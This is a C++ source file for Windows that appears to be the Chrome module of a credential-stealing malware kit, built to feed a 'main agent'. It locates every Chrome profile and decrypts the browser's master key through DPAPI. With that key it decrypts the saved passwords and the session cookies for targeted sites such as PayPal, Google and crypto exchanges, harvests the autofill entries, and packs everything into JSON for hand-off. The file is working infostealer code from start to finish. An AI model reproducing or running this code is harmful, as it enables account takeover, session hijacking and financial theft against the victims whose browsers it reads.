#include <windows.h>
#include <shlobj.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <string>
#include <vector>
#include <sstream>
#include <memory>
#include "../common.h"
#include "../utils.h"
#include "sqlite_minimal.h"
#include "wallets.h"
#include "chrome.h"

// Logging functions
extern void LogInfo(const char* message);
extern void LogError(const char* message);

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")

void ExampleUse() {
    auto profiles = GetBrowserProfiles();
    for (const auto& bp : profiles) {
        const std::string& browser = bp.first;
        const std::string& profilePath = bp.second;

        auto foundBanks = ExtractBankingData(profilePath);
        if (!foundBanks.empty()) {
            LogInfo(("Banking data collected from " + browser).c_str());
        }
    }
}


// Chrome data structures
struct ChromeProfile {
    std::wstring name;
    std::wstring path;
};

struct ChromePassword {
    std::string url;
    std::string username;
    std::string password;
};

struct ChromeCookie {
    std::string host;
    std::string name;
    std::string value;
    std::string path;
    bool secure;
    bool httponly;
};

struct ChromeAutofill {
    std::string name;
    std::string value;
};

class ChromeDataExtractor {
private:
    std::wstring chrome_user_data;
    std::vector<uint8_t> master_key;
    std::vector<ChromeProfile> profiles;
    
public:
    ChromeDataExtractor() {
        InitializePaths();
        LoadMasterKey();
        FindProfiles();
    }
    
    // Extract all Chrome data
    std::string ExtractAll() {
        std::stringstream json;
        json << "{";
        json << "\"browser\":\"chrome\",";
        json << "\"version\":\"" << GetChromeVersion() << "\",";
        json << "\"profiles\":[";
        
        bool firstProfile = true;
        for (const auto& profile : profiles) {
            if (!firstProfile) json << ",";
            firstProfile = false;
            
            json << "{";
            json << "\"name\":\"" << Utils::WStringToString(profile.name) << "\",";
            
            // Extract passwords
            json << "\"passwords\":[";
            auto passwords = ExtractPasswords(profile.path);
            bool firstPass = true;
            for (const auto& pass : passwords) {
                if (!firstPass) json << ",";
                firstPass = false;
                
                json << "{";
                json << "\"url\":\"" << EscapeJson(pass.url) << "\",";
                json << "\"username\":\"" << EscapeJson(pass.username) << "\",";
                json << "\"password\":\"" << EscapeJson(pass.password) << "\"";
                json << "}";
            }
            json << "],";
            
            // Extract cookies
            json << "\"cookies\":[";
            auto cookies = ExtractCookies(profile.path);
            bool firstCookie = true;
            for (const auto& cookie : cookies) {
                if (!firstCookie) json << ",";
                firstCookie = false;
                
                json << "{";
                json << "\"host\":\"" << EscapeJson(cookie.host) << "\",";
                json << "\"name\":\"" << EscapeJson(cookie.name) << "\",";
                json << "\"value\":\"" << EscapeJson(cookie.value) << "\",";
                json << "\"path\":\"" << EscapeJson(cookie.path) << "\",";
                json << "\"secure\":" << (cookie.secure ? "true" : "false") << ",";
                json << "\"httponly\":" << (cookie.httponly ? "true" : "false");
                json << "}";
            }
            json << "],";
            
            // Extract autofill
            json << "\"autofill\":[";
            auto autofills = ExtractAutofill(profile.path);
            bool firstAuto = true;
            for (const auto& auto_item : autofills) {
                if (!firstAuto) json << ",";
                firstAuto = false;
                
                json << "{";
                json << "\"name\":\"" << EscapeJson(auto_item.name) << "\",";
                json << "\"value\":\"" << EscapeJson(auto_item.value) << "\"";
                json << "}";
            }
            json << "]";
            
            json << "}";
        }
        
        json << "]}";
        
        return json.str();
    }
    
private:
    void InitializePaths() {
        WCHAR path[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
            chrome_user_data = std::wstring(path) + L"\\Google\\Chrome\\User Data";
        }
    }
    
    void FindProfiles() {
        // Default profile
        if (Utils::DirectoryExists(chrome_user_data + L"\\Default")) {
            profiles.push_back({L"Default", chrome_user_data + L"\\Default"});
        }
        
        // Additional profiles (Profile 1, Profile 2, etc.)
        for (int i = 1; i <= 10; i++) {
            std::wstring profileName = L"Profile " + std::to_wstring(i);
            std::wstring profilePath = chrome_user_data + L"\\" + profileName;
            if (Utils::DirectoryExists(profilePath)) {
                profiles.push_back({profileName, profilePath});
            }
        }
    }
    
    bool LoadMasterKey() {
        try {
            std::wstring localStatePath = chrome_user_data + L"\\Local State";
            
            HANDLE hFile = CreateFileW(localStatePath.c_str(), GENERIC_READ,
                                      FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                                      NULL, OPEN_EXISTING, 0, NULL);
            
            if (hFile == INVALID_HANDLE_VALUE) {
                DWORD error = GetLastError();
                LogError(("Chrome LoadMasterKey: Failed to open Local State file, error: " + std::to_string(error)).c_str());
                return false;
            }
            
            LARGE_INTEGER fileSize;
            if (!GetFileSizeEx(hFile, &fileSize) || fileSize.QuadPart > 10 * 1024 * 1024) {
                CloseHandle(hFile);
                LogError("Chrome LoadMasterKey: Invalid file size or file too large");
                return false;
            }
            
            std::vector<char> buffer((size_t)fileSize.QuadPart);
            DWORD bytesRead;
            if (!ReadFile(hFile, buffer.data(), (DWORD)buffer.size(), &bytesRead, NULL) || 
                bytesRead != (DWORD)buffer.size()) {
                CloseHandle(hFile);
                LogError("Chrome LoadMasterKey: Failed to read file completely");
                return false;
            }
            CloseHandle(hFile);
            
            // Find encrypted_key in JSON
            std::string json(buffer.begin(), buffer.end());
            size_t keyPos = json.find("\"encrypted_key\":\"");
            if (keyPos == std::string::npos) {
                LogError("Chrome LoadMasterKey: encrypted_key not found in JSON");
                return false;
            }
            
            keyPos += 17;
            size_t keyEnd = json.find("\"", keyPos);
            if (keyEnd == std::string::npos || keyEnd <= keyPos) {
                LogError("Chrome LoadMasterKey: Invalid encrypted_key format");
                return false;
            }
            
            std::string encodedKey = json.substr(keyPos, keyEnd - keyPos);
            if (encodedKey.empty() || encodedKey.length() > 1024) {
                LogError("Chrome LoadMasterKey: Invalid encoded key length");
                return false;
            }
            
            // Base64 decode with validation
            DWORD decodedSize = 0;
            if (!CryptStringToBinaryA(encodedKey.c_str(), (DWORD)encodedKey.length(),
                                     CRYPT_STRING_BASE64, NULL, &decodedSize, NULL, NULL) ||
                decodedSize == 0 || decodedSize > 512) {
                LogError("Chrome LoadMasterKey: Base64 decode size validation failed");
                return false;
            }
            
            std::vector<uint8_t> encryptedKey(decodedSize);
            if (!CryptStringToBinaryA(encodedKey.c_str(), (DWORD)encodedKey.length(),
                                     CRYPT_STRING_BASE64, encryptedKey.data(), 
                                     &decodedSize, NULL, NULL)) {
                LogError("Chrome LoadMasterKey: Base64 decode failed");
                return false;
            }
            
            // Validate DPAPI prefix and remove it
            if (encryptedKey.size() < 5) {
                LogError("Chrome LoadMasterKey: Encrypted key too short for DPAPI prefix");
                return false;
            }
            encryptedKey.erase(encryptedKey.begin(), encryptedKey.begin() + 5);
            
            if (encryptedKey.empty() || encryptedKey.size() > 256) {
                LogError("Chrome LoadMasterKey: Invalid encrypted key size after prefix removal");
                return false;
            }
            
            // Decrypt using DPAPI with validation
            DATA_BLOB input, output;
            input.pbData = encryptedKey.data();
            input.cbData = (DWORD)encryptedKey.size();
            
            if (!CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
                DWORD error = GetLastError();
                LogError(("Chrome LoadMasterKey: DPAPI decryption failed, error: " + std::to_string(error)).c_str());
                return false;
            }
            
            if (!output.pbData || output.cbData == 0 || output.cbData != 32) {
                if (output.pbData) LocalFree(output.pbData);
                LogError("Chrome LoadMasterKey: Invalid master key size (expected 32 bytes)");
                return false;
            }
            
            master_key.assign(output.pbData, output.pbData + output.cbData);
            LocalFree(output.pbData);
            
            LogInfo("Chrome LoadMasterKey: Master key loaded successfully");
            return true;
            
        } catch (const std::exception& e) {
            LogError(("Chrome LoadMasterKey: Exception - " + std::string(e.what())).c_str());
            return false;
        } catch (...) {
            LogError("Chrome LoadMasterKey: Unknown exception occurred");
            return false;
        }
    }
    
    std::vector<ChromePassword> ExtractPasswords(const std::wstring& profilePath) {
        std::vector<ChromePassword> passwords;
        std::wstring loginDataPath = profilePath + L"\\Login Data";
        
        if (!Utils::FileExists(loginDataPath)) return passwords;
        
        MinimalSQLiteReader reader;
        if (!reader.LoadDatabase(loginDataPath)) return passwords;
        
        uint32_t rootPage = 0;
        if (!reader.FindTableRootPage("logins", rootPage)) return passwords;
        
        auto rows = reader.ExtractTable(rootPage);
        
        for (const auto& row : rows) {
            // Columns: origin_url, username_value, password_value
            if (row.size() >= 7) {
                ChromePassword pass;
                pass.url = BytesToString(row[0]);      // origin_url
                pass.username = BytesToString(row[3]);  // username_value
                
                // Decrypt password
                std::vector<uint8_t> encryptedPass = row[5];  // password_value
                if (!encryptedPass.empty()) {
                    std::string decrypted = DecryptPassword(encryptedPass);
                    pass.password = decrypted;
                    
                    if (!pass.url.empty() && (!pass.username.empty() || !pass.password.empty())) {
                        passwords.push_back(pass);
                    }
                }
            }
        }
        
        return passwords;
    }
    
    std::vector<ChromeCookie> ExtractCookies(const std::wstring& profilePath) {
        std::vector<ChromeCookie> cookies;
        std::wstring cookiesPath = profilePath + L"\\Cookies";
        
        if (!Utils::FileExists(cookiesPath)) return cookies;
        
        MinimalSQLiteReader reader;
        if (!reader.LoadDatabase(cookiesPath)) return cookies;
        
        uint32_t rootPage = 0;
        if (!reader.FindTableRootPage("cookies", rootPage)) return cookies;
        
        auto rows = reader.ExtractTable(rootPage);
        
        // Limit to important cookies
        std::vector<std::string> importantHosts = {
            "facebook.com", "google.com", "amazon.com", "paypal.com",
            "github.com", "twitter.com", "instagram.com", "linkedin.com",
            "binance.com", "coinbase.com", "kraken.com"
        };
        
        for (const auto& row : rows) {
            if (row.size() >= 14) {
                std::string host = BytesToString(row[1]);  // host_key
                
                // Check if it's an important host
                bool isImportant = false;
                for (const auto& important : importantHosts) {
                    if (host.find(important) != std::string::npos) {
                        isImportant = true;
                        break;
                    }
                }
                
                if (isImportant) {
                    ChromeCookie cookie;
                    cookie.host = host;
                    cookie.name = BytesToString(row[2]);   // name
                    cookie.path = BytesToString(row[4]);   // path
                    cookie.secure = BytesToInt(row[8]) != 0;  // is_secure
                    cookie.httponly = BytesToInt(row[9]) != 0; // is_httponly
                    
                    // Decrypt value
                    std::vector<uint8_t> encryptedValue = row[3];  // value
                    if (!encryptedValue.empty()) {
                        cookie.value = DecryptPassword(encryptedValue);
                        if (!cookie.value.empty()) {
                            cookies.push_back(cookie);
                        }
                    }
                }
            }
        }
        
        return cookies;
    }
    
    std::vector<ChromeAutofill> ExtractAutofill(const std::wstring& profilePath) {
        std::vector<ChromeAutofill> autofills;
        std::wstring webDataPath = profilePath + L"\\Web Data";
        
        if (!Utils::FileExists(webDataPath)) return autofills;
        
        MinimalSQLiteReader reader;
        if (!reader.LoadDatabase(webDataPath)) return autofills;
        
        uint32_t rootPage = 0;
        if (!reader.FindTableRootPage("autofill", rootPage)) return autofills;
        
        auto rows = reader.ExtractTable(rootPage);
        
        for (const auto& row : rows) {
            if (row.size() >= 3) {
                ChromeAutofill item;
                item.name = BytesToString(row[0]);   // name
                item.value = BytesToString(row[1]);  // value
                
                // Filter out unimportant entries
                if (!item.name.empty() && !item.value.empty() &&
                    item.value.length() > 3) {  // Skip short values
                    autofills.push_back(item);
                }
            }
        }
        
        return autofills;
    }
    
    std::string DecryptPassword(const std::vector<uint8_t>& encrypted) {
        if (encrypted.size() < 15) return "";
        
        // Check for v10 prefix (Chrome 80+)
        if (encrypted[0] == 'v' && encrypted[1] == '1' && encrypted[2] == '0') {
            if (master_key.empty()) return "";
            
            // Extract nonce and ciphertext
            std::vector<uint8_t> nonce(encrypted.begin() + 3, encrypted.begin() + 15);
            std::vector<uint8_t> ciphertext(encrypted.begin() + 15, encrypted.end() - 16);
            std::vector<uint8_t> tag(encrypted.end() - 16, encrypted.end());
            
            // Decrypt using AES-GCM
            return DecryptAESGCM(ciphertext, nonce, tag);
        } else {
            // Old DPAPI method
            DATA_BLOB input, output;
            input.pbData = (BYTE*)encrypted.data();
            input.cbData = (DWORD)encrypted.size();
            
            if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
                std::string result((char*)output.pbData, output.cbData);
                LocalFree(output.pbData);
                return result;
            }
        }
        
        return "";
    }
    
    std::string DecryptAESGCM(const std::vector<uint8_t>& ciphertext,
                              const std::vector<uint8_t>& nonce,
                              const std::vector<uint8_t>& tag) {
        BCRYPT_ALG_HANDLE hAlg = NULL;
        BCRYPT_KEY_HANDLE hKey = NULL;
        std::string result;
        
        try {
            // Validate input parameters
            if (ciphertext.empty() || ciphertext.size() > 64 * 1024) {
                LogError("Chrome DecryptAESGCM: Invalid ciphertext size");
                return result;
            }
            
            if (nonce.size() != 12) {
                LogError("Chrome DecryptAESGCM: Invalid nonce size (expected 12 bytes)");
                return result;
            }
            
            if (tag.size() != 16) {
                LogError("Chrome DecryptAESGCM: Invalid tag size (expected 16 bytes)");
                return result;
            }
            
            if (master_key.size() != 32) {
                LogError("Chrome DecryptAESGCM: Invalid master key size (expected 32 bytes)");
                return result;
            }
            
            // Open algorithm provider
            NTSTATUS status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
            if (status != 0) {
                LogError(("Chrome DecryptAESGCM: Failed to open algorithm provider, status: 0x" + 
                         std::to_string(status)).c_str());
                return result;
            }
            
            // Set GCM mode
            status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, 
                                     (PUCHAR)BCRYPT_CHAIN_MODE_GCM, 
                                     sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
            if (status != 0) {
                LogError(("Chrome DecryptAESGCM: Failed to set GCM mode, status: 0x" + 
                         std::to_string(status)).c_str());
                BCryptCloseAlgorithmProvider(hAlg, 0);
                return result;
            }
            
            // Generate key
            status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0,
                                              (PUCHAR)master_key.data(), 
                                              (ULONG)master_key.size(), 0);
            if (status != 0) {
                LogError(("Chrome DecryptAESGCM: Failed to generate symmetric key, status: 0x" + 
                         std::to_string(status)).c_str());
                BCryptCloseAlgorithmProvider(hAlg, 0);
                return result;
            }
            
            // Setup authentication info
            BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
            BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
            authInfo.pbNonce = (PUCHAR)nonce.data();
            authInfo.cbNonce = (ULONG)nonce.size();
            authInfo.pbTag = (PUCHAR)tag.data();
            authInfo.cbTag = (ULONG)tag.size();
            
            // Decrypt
            std::vector<uint8_t> plaintext(ciphertext.size());
            ULONG cbResult = 0;
            
            status = BCryptDecrypt(hKey, 
                                  (PUCHAR)ciphertext.data(), 
                                  (ULONG)ciphertext.size(),
                                  &authInfo, 
                                  NULL, 
                                  0,
                                  plaintext.data(), 
                                  (ULONG)plaintext.size(), 
                                  &cbResult, 
                                  0);
            
            if (status == 0) {
                if (cbResult > 0 && cbResult <= 1024) {  // Reasonable password length
                    result.assign((char*)plaintext.data(), cbResult);
                } else {
                    LogError("Chrome DecryptAESGCM: Decrypted data has invalid size");
                }
            } else {
                LogError(("Chrome DecryptAESGCM: Decryption failed, status: 0x" + 
                         std::to_string(status)).c_str());
            }
            
        } catch (const std::exception& e) {
            LogError(("Chrome DecryptAESGCM: Exception - " + std::string(e.what())).c_str());
        } catch (...) {
            LogError("Chrome DecryptAESGCM: Unknown exception occurred");
        }
        
        if (hKey) BCryptDestroyKey(hKey);
        if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
        
        return result;
    }
    
    std::string GetChromeVersion() {
        // Try to get Chrome version from registry
        HKEY hKey;
        char version[64] = "Unknown";
        DWORD size = sizeof(version);
        
        if (RegOpenKeyExA(HKEY_CURRENT_USER,
                         "Software\\Google\\Chrome\\BLBeacon",
                         0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            RegQueryValueExA(hKey, "version", NULL, NULL, 
                           (LPBYTE)version, &size);
            RegCloseKey(hKey);
        }
        
        return std::string(version);
    }
    
    std::string EscapeJson(const std::string& str) {
        std::string result;
        for (char c : str) {
            switch (c) {
                case '"': result += "\\\""; break;
                case '\\': result += "\\\\"; break;
                case '\b': result += "\\b"; break;
                case '\f': result += "\\f"; break;
                case '\n': result += "\\n"; break;
                case '\r': result += "\\r"; break;
                case '\t': result += "\\t"; break;
                default:
                    if (c >= 0x20 && c <= 0x7E) {
                        result += c;
                    } else {
                        char buf[7];
                        snprintf(buf, sizeof(buf), "\\u%04x", (unsigned char)c);
                        result += buf;
                    }
            }
        }
        return result;
    }
};

// Export function for main agent
extern "C" {
    const char* ExtractChromeData() {
        static std::string result;
        
        try {
            ChromeDataExtractor extractor;
            result = extractor.ExtractAll();
            
            extern void LogInfo(const char*);
            LogInfo("Chrome data extraction completed");
            
            return result.c_str();
        } catch (...) {
            extern void LogError(const char*);
            LogError("Failed to extract Chrome data");
            
            result = "{\"browser\":\"chrome\",\"error\":\"extraction_failed\",\"profiles\":[]}";
            return result.c_str();
        }
    }
}